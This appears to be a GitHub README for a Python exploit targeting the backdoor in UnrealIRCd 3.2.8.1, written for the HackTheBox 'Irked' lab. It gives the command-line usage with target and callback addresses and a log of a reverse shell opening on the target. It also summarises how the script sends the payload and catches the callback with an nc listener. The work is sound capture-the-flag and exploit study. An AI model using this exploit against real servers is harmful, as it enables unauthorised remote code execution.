## Description

Exploit an [UnrealIRCd server](https://www.unrealircd.org/). Version 3.2.8.1 contains a backdoor which can provide RCE. There's already a [Metasploit exploit module](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor) for the vulnerability, but it's a customized backdoor script.

Developed this script for [Irked from HackTheBox](https://www.hackthebox.eu/home/machines/profile/163), it should be generic to any UnrealIRCd deployment on Linux, provided that a mkfifo reverse shell works on the target.

## Usage

### exploit.py

Call the python script with four arguments to identify the target ip and port, and the callback ip and port you want to use. Then, wait and get a shell:

```
root@kali# ./unreal_3.2.8.1_exploit.py 10.10.10.117 8067 10.10.14.14 4444
[*] Connecting to 10.10.10.117:6697
[*] Sending payload
[+] Payload sent. Closing socket.
[*] Opening listener. Callback should come within a minute
bash: cannot set terminal process group (634): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ id
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

![image](https://github.com/h4md153v63n/Python_Scripts/assets/5091265/e9aca050-8c04-4fc1-afff-dd6daaaf6ca5)


### exploit2.py

![image](https://github.com/h4md153v63n/Python_Scripts/assets/5091265/87096377-57e4-49e0-81fd-35715d6e623e)



### Here’s what it does:
+ Checks for right number of args and set variables, or prints usage. [Lines 7-11]
+ Connects to the host, gets first message from host. [13-20]
+ Sends payload and closes socket. [22-25]
+ Uses subprocess to run a nc listener, waits for callback, and then lets me interact with it until ctrl-c to exit. [27-33]


## References:
- https://0xdf.gitlab.io/2019/04/27/htb-irked.html#script-it
- https://gitlab.com/0xdf/ctfscripts/-/tree/master/unreal_irc_3.2.8.1_shell.py
